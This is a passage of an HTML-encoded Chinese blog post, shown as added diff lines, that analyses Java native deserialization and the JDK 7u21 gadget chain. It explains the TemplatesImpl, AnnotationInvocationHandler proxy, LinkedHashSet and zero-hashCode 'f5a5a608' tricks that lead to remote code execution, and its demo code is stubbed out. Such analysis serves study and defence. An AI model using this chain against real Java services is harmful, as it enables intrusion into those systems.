+<li><code>ObjectStreamClass.newInstance()</code>&#x83B7;&#x53D6;&#x5E76;&#x8C03;&#x7528;&#x79BB;&#x5BF9;&#x8C61;&#x6700;&#x8FD1;&#x7684;&#x975E;<code>Serializable</code>&#x7684;&#x7236;&#x7C7B;&#x7684;&#x65E0;&#x53C2;&#x6784;&#x9020;&#x65B9;&#x6CD5; <em>&#xFF08;&#x82E5;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;<code>null</code>&#xFF09;</em> &#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;</li>
+<li><code>readSerialData()</code>&#x8BFB;&#x53D6;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;<ul>
+<li>&#x82E5;&#x7C7B;&#x81EA;&#x5B9A;&#x4E49;&#x4E86;<code>readObject()</code>&#xFF0C;&#x5219;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#x8BFB;&#x5BF9;&#x8C61;&#xFF0C;&#x5426;&#x5219;&#x8C03;&#x7528;<code>defaultReadFields()</code>&#x8BFB;&#x53D6;&#x5E76;&#x586B;&#x5145;&#x5BF9;&#x8C61;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x636E;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>&#x8865;&#x5145;&#x4E00;&#x4E2A;&#x7EC6;&#x8282;&#x662F;&#x5728;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x5224;&#x65AD;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png" alt></p>
+<p>&#x5982;&#x679C;&#x6EE1;&#x8DB3; <code>hasReadObjectMethod</code> &#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528; <code>invokeReadObject</code></p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214151252315.png" alt></p>
+<p>&#x5F15;&#x7528; @l1nk3r &#x5E08;&#x5085;&#x7684;&#x603B;&#x7ED3;</p>
+<blockquote>
+<p>&#x662F;&#x5426;&#x91CD;&#x5199;&#x4E86; <strong>readObject</strong> &#x5F71;&#x54CD;&#x7684;&#x662F; <strong>slotDesc.hasReadObjectMethod()</strong> &#x7684;&#x7ED3;&#x679C;</p>
+<p>&#x5982;&#x679C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7C7B;&#x91CD;&#x5199;&#x4E86; <strong>readObject</strong> &#xFF0C;&#x8BE5;&#x6570;&#x636E;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6838;&#x5FC3;&#x6D41;&#x7A0B;&#x8D70;&#x5230; <strong>readSerialData</strong> &#x65B9;&#x6CD5;&#x4E2D;&#x7684; <strong>slotDesc.invokeReadObject</strong> &#x65B9;&#x6CD5;&#xFF0C;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x89E6;&#x53D1;&#x76F8;&#x5173;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x4E14;&#x8C03;&#x7528;&#x91CD;&#x5199;&#x7684; <strong>readObject</strong> &#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x91CD;&#x5199; <strong>readObject</strong> &#xFF0C;&#x5219;&#x8C03;&#x7528; <strong>ObjectInputStream</strong> &#x7C7B;&#x4E2D;&#x7684; <strong>readObject</strong> &#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
+</blockquote>
+<p>&#x540C;&#x65F6;&#x8865;&#x4E00;&#x5F20;&#x6D41;&#x7A0B;&#x56FE;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/u4inn.png" alt></p>
+<p>&#x66F4;&#x4E3A;&#x8BE6;&#x7EC6;&#x7684;&#x6D41;&#x7A0B;&#x5206;&#x6790;&#x53EF;&#x4EE5;&#x770B;&#x4EE5;&#x4E0B;&#x6587;&#x7AE0;&#xFF1A;</p>
+<p><a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x6DF1;&#x7A76;</a></p>
+<p><a href="http://redteam.today/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">Java&#x539F;&#x751F;&#x5E8F;&#x5217;&#x5316;&#x4E0E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4EE3;&#x7801;&#x7B80;&#x8981;&#x5206;&#x6790;</a></p>
+<p><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">&#x6D45;&#x6790;Java&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</a></p>
+<h1 id="JDK-7u21-Gadget-Chain"><a href="#JDK-7u21-Gadget-Chain" class="headerlink" title="JDK 7u21 Gadget Chain"></a>JDK 7u21 Gadget Chain</h1><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>&#x5927;&#x81F4;&#x51E0;&#x70B9;&#x53EF;&#x4EE5;&#x770B;&#x4E00;&#x4E0B; @&#x5929;&#x878D;&#x4FE1;&#x963F;&#x5C14;&#x6CD5;&#x5B9E;&#x9A8C;&#x5BA4; &#x8FD9;&#x4E2A;&#x8111;&#x56FE; </p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/abfd01ca-62cc-4ad9-80e0-c7ce8fee9d51.png-w331s" alt></p>
+<p>CC &#x4E2D;&#x6211;&#x4EEC;&#x4E5F;&#x7528;&#x5230;&#x4E86;&#x901A;&#x8FC7; javassist &#x6784;&#x9020;  Static Initializers&#xFF0C;&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x6784;&#x9020;&#x8C03;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x7ED3;&#x5408; javassist &#x5B9E;&#x73B0;&#x7684;&#x4E00;&#x4E2A; RCE &#x7684; demo&#xFF0C;&#x5F53;&#x65F6;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x7528; <code>IvokerTransformer#transform</code> &#x53BB;&#x89E6;&#x53D1; <code>TemplatesImpl#newTransformer</code> &#x6765;&#x8FBE;&#x5230; RCE</p>
+<p>&#x56DE;&#x770B; <code>TemplatesImpl</code> &#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#xFF0C;&#x5176;&#x5B9E;&#x8C03;&#x7528;&#x4E86;  <code>TemplatesImpl#newTransformer</code>  &#x7684;&#x4E5F;&#x80FD; RCE&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x8FD9;&#x91CC; <code>TemplatesImpl#getOutputProperties</code></p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214155858889.png" alt></p>
+<p>&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x5B9E;&#x73B0;&#x7B2C;&#x4E00;&#x4E2A; RCE demo</p>
+<p><strong>Level-0 demo</strong></p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-comment">// javassist fake Code</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x53E6;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#x662F; hashCode &#x7684;&#x4E00;&#x4E2A;&#x5C0F; trick&#xFF0C;<code>f5a5a608</code> &#x7684; hashCode &#x503C;&#x4E3A; 0</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216155234182.png" alt></p>
+<h2 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>&#x770B;&#x4E00;&#x4E0B; <code>javax.xml.transform.Templates</code> &#xFF0C;&#x91CC;&#x9762;&#x6709;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#x90FD;&#x662F;&#x6211;&#x4EEC;&#x60F3;&#x8C03;&#x7528;&#x7684;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x53EA;&#x8981;&#x80FD;&#x5FAA;&#x73AF;&#x6253;&#x5370;&#x8FD9;&#x4E2A; interface &#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x5728;&#x67D0;&#x4E2A;&#x7C7B;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x5373;&#x53EF; RCE</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214172424266.png" alt></p>
+<p>&#x518D;&#x7ED3;&#x5408;&#x540C;&#x6837;&#x5728; CC &#x4E2D;&#x7528;&#x8FC7;&#x7684; AnnotationInvocationHandler &#x548C;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x7B2C;&#x4E8C;&#x4E2A; RCE demo</p>
+<p><strong>Level-1 demo</strong></p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">      <span class="hljs-comment">// javassist fake Code</span></span><br><span class="line">      <span class="hljs-comment">// proxy fake Code</span></span><br><span class="line">        proxy.equals(templates);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x4ECE;&#x6B63;&#x5411;&#x601D;&#x7EF4;&#x6765;&#x770B;&#xFF0C;&#x5148;&#x8C08;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528; <code>equals</code> &#x6765;&#x89E6;&#x53D1; </p>
+<p>&#x6838;&#x5FC3;&#x539F;&#x56E0;&#x662F;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x89E6;&#x53D1; <code>AnnotationInvocationHandler#invoke</code>&#x662F;&#x8FD9;&#x4E9B; if &#x5224;&#x65AD;&#x548C;&#x53C2;&#x6570;&#x9644;&#x503C;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6765; <code>var4</code> &#x9700;&#x8981;&#x7B49;&#x4E8E; <code>equals</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x624D;&#x884C;&#xFF0C;&#x540E;&#x9762;&#x7684; <code>this.equalsImpl(var3[0]);</code> &#x662F;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x65B9;&#x6CD5;&#xFF0C;&#x6B64;&#x65F6; <code>var3[0]</code> &#x662F;&#x6211;&#x4EEC; POC &#x4E2D;&#x7684; <code>equals</code>&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; <code>templates</code></p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214174341040.png" alt></p>
+<p><code>AnnotationInvocationHandler#equalsImpl</code> &#x8FD9;&#x91CC;&#x4F1A;&#x5FAA;&#x73AF;&#x904D;&#x5386; <code>javax.xml.transform.Templates</code> &#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x88AB;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;  <code>templates</code> &#x8C03;&#x7528;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214175058607.png" alt="image-20210214175058607"></p>
+<p>&#x540E;&#x7EED;&#x5BFB;&#x627E;&#x8C03;&#x7528;&#x94FE;&#x8981;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x4F20;&#x5165;&#x4E00;&#x4E2A; proxy&#xFF0C;&#x540C;&#x65F6;&#x8C03;&#x7528; equals &#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x80FD;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x5730;&#x65B9;</p>
+<p>&#x8FD9;&#x91CC;&#x770B;&#x4E00;&#x4E0B; LinkedHashSet&#xFF0C;&#x5176;&#x7EE7;&#x627F;&#x81EA; HashSet &#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x8981;&#x627E;&#x5230;&#x6EE1;&#x8DB3;&#x8C03;&#x7528;&#x94FE;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;LinkedHashSet &#x662F;&#x6709;&#x5E8F;&#x7684;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5B83;&#xFF0C;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x81EA;&#x7236;&#x7C7B;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216162034161.png" alt></p>
+<p>&#x5176;&#x5B9E;&#x73B0;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x903B;&#x8F91;&#x4E5F;&#x90FD;&#x5B58;&#x5728;&#x5728;&#x7236;&#x7C7B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5728; CC &#x4E2D;&#x5206;&#x6790;&#x8FC7; HashSet</p>
+<p>&#x5176;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4F1A;&#x6062;&#x590D;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5E76;&#x8C03;&#x7528; HashMap &#x7684; put &#x65B9;&#x6CD5;&#xFF0C;&#x5C06;&#x5176;&#x653E;&#x5165; HashMap &#x4E2D;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210219204734743.png" alt></p>
+<p><code>HashMap#put</code> &#x662F;&#x6211;&#x4EEC;&#x8C03;&#x7528;&#x7684;&#x5173;&#x952E;&#x5730;&#x65B9;</p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// &#x5224;&#x65AD; key &#x662F;&#x5426;&#x4E3A;null</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> putForNullKey(value);</span><br><span class="line">  <span class="hljs-comment">// &#x8BA1;&#x7B97; key &#x7684; hash</span></span><br><span class="line">    <span class="hljs-keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) {</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="hljs-keyword">this</span>);</span><br><span class="line">            <span class="hljs-keyword">return</span> oldValue;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x6838;&#x5FC3;&#x8BED;&#x53E5;&#x4E3A; <code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code> &#xFF0C;&#x8FD9;&#x91CC; <code>key.equals(k)</code> &#x662F;&#x6211;&#x4EEC;&#x53CD;&#x5E8F;&#x5217;&#x5316; POC &#x60F3;&#x8C03;&#x7528;&#x7684;&#x4E00;&#x4E2A;&#x7ED3;&#x6784;</p>
+<p>&#x56E0;&#x6B64;&#x6839;&#x636E;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;&#x7684;&#x77ED;&#x8DEF;&#x7279;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x7B2C;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x9700;&#x8981;&#x4E0D;&#x6EE1;&#x8DB3;&#x7B2C;&#x4E8C;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x624D;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x7B2C;&#x4E09;&#x4E2A;&#x6761;&#x4EF6;</p>
+<p>&#x8FD9;&#x91CC;&#x4F1A;&#x6709;&#x4E24;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x5148;&#x770B;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;key &#x4E3A;&#x6211;&#x4EEC;&#x7684; POC &#x7684; <code>testTarget.add(templates);</code> &#x7684; TemplatesImpl &#x5BF9;&#x8C61;&#xFF0C;&#x7531;&#x4E8E;&#x5F53;&#x524D; table &#x53D8;&#x91CF;&#x6307;&#x5411;&#x7684; Entry &#x5BF9;&#x8C61;&#x662F;&#x7A7A;&#x7684;&#xFF0C;&#x6240;&#x4EE5; e &#x662F;&#x4E3A;null&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x6EE1;&#x8DB3; for &#x5FAA;&#x73AF;&#x6761;&#x4EF6;&#xFF0C;&#x5728;&#x540E;&#x9762;&#x4F1A;&#x8C03;&#x7528; <code>addEntry</code> &#x6DFB;&#x52A0;&#x8FDB; table&#xFF0C;table&#x662F;&#x4E00;&#x4E2A;Entry&#x6570;&#x7EC4;&#xFF0C;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6211;&#x4EEC;&#x901A;&#x8FC7;<code>map.put()</code>&#x4F20;&#x5165;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5E76;&#x4F5C;&#x4E3A;&#x540E;&#x7EED;&#x5224;&#x65AD;&#x65B0;&#x4F20;&#x5165;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x548C;&#x65E7;&#x952E;&#x503C;&#x5BF9;&#x662F;&#x5426;&#x91CD;&#x590D;&#x7684;&#x4F9D;&#x636E;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220151023288.png" alt></p>
+<p>&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x4E3A;&#x4E86;&#x6EE1;&#x8DB3; <code>e != null</code> &#x90A3;&#x4E48;&#x9700;&#x8981;&#x63A7;&#x5236; i &#x7684;&#x503C;&#xFF0C;&#x4F7F;&#x5176;&#x80FD;&#x4ECE; table &#x91CC;&#x9762;&#x53D6;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x63A7;&#x5236;&#x4E24;&#x6B21;&#x5FAA;&#x73AF;&#x4E2D; hash &#x4E4B;&#x540E;&#x7684;&#x503C;&#x76F8;&#x7B49;</p>
+<p>&#x5148;&#x770B;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x4E2D;&#x8BA1;&#x7B97; hash &#x503C;</p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object k)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (useAltHashing) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (k <span class="hljs-keyword">instanceof</span> String) {</span><br><span class="line">            <span class="hljs-keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        }</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="hljs-comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="hljs-comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x8BA1;&#x7B97; hash &#x503C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x6CA1;&#x6709; hashCode &#x65B9;&#x6CD5;&#xFF0C;&#x4F1A;&#x76F8;&#x5E94;&#x8C03;&#x7528;&#x53CD;&#x5C04;&#x6765;&#x89E3;&#x51B3;&#xFF0C;&#x6700;&#x7EC8;&#x8C03;&#x7528;&#x5230; <code>AnnotationInvocationHandler#hashCodeImpl</code></p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">hashCodeImpl:<span class="hljs-number">294</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:<span class="hljs-number">64</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">hashCode:-<span class="hljs-number">1</span>, $Proxy1 (com.sun.proxy)</span><br><span class="line">hash:<span class="hljs-number">351</span>, HashMap (java.util)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220160741224.png" alt></p>
+<blockquote>
+<p>&#x6B64;&#x65F6;&#x7684;var2&#x662F;&#x4E00;&#x4E2A;Iterator&#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x6765;&#x904D;&#x5386;memberValues&#x5BF9;&#x8C61;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;memberValues&#x4E2D;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x5C31;&#x662F;&#xFF0C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5728;&#x521D;&#x671F;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x751F;&#x6210; AnnotationInvocationHandler &#x5BF9;&#x8C61;&#x65F6;&#x4F20;&#x5165;&#x7684; HashMap &#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x90A3;&#x4E2A;&#x952E;&#x503C;&#x5BF9; </p>
+</blockquote>
+<p>key&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x201D;f5a5a608&#x201D; </p>
+<p>Value&#x503C;&#x662F;&#x548C;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x7528;&#x6765;&#x8BA1;&#x7B97;hash&#x503C;&#x7684;&#x540C;&#x4E00;&#x4E2A;TemplatesImpl&#x5BF9;&#x8C61;</p>
+<p>&#x770B;&#x4E00;&#x4E0B;&#x5177;&#x4F53; hash &#x503C;&#x7684;&#x8BA1;&#x7B97;</p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">var1 += <span class="hljs-number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x5177;&#x4F53;&#x5206;&#x4E3A;&#x4E86;&#x4E24;&#x6BB5;</p>
+<ol>
+<li><code>127 * ((String)var3.getKey()).hashCode()</code></li>
+<li><code>memberValueHashCode(var3.getValue()</code></li>
+</ol>
+<p>&#x7B2C;&#x4E8C;&#x6BB5;&#x7531;&#x4E8E; Value &#x4E3A;&#x8BA1;&#x7B97;hash&#x503C;&#x7684;&#x540C;&#x4E00;&#x4E2A;TemplatesImpl&#x5BF9;&#x8C61;&#xFF0C;&#x56E0;&#x6B64;&#x8BA1;&#x7B97;&#x51FA;&#x6765;&#x8DDF;&#x4E4B;&#x524D;&#x7684;&#x76F8;&#x7B49;</p>
+<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220162047284.png" alt></p>
+<p>&#x4E00;&#x4E2A;&#x5C0F; trick &#x662F;&#xFF1A;0&#x548C;&#x4EFB;&#x4F55;&#x6570;&#x5B57;&#x8FDB;&#x884C;&#x5F02;&#x6216;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x662F;&#x88AB;&#x5F02;&#x6216;&#x6570;&#x672C;&#x8EAB;</p>
